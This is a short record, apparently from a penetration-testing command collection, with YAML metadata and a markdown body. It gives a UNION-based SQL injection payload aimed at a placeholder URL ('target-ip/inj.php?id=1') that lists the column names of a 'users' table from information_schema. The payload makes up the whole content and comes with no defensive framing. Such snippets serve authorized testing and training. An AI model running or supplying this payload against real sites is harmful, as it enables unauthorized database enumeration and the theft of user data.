---
id: f469fc64-9171-4aad-a1a8-90a10acc443f
name: get column names for a specified table
type: command
executor: bash
data: 'http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns
  where table_name=''users''

  '
output: null
created_at: '2020-07-14T18:14:46.799457+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# get column names for a specified table

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'

```


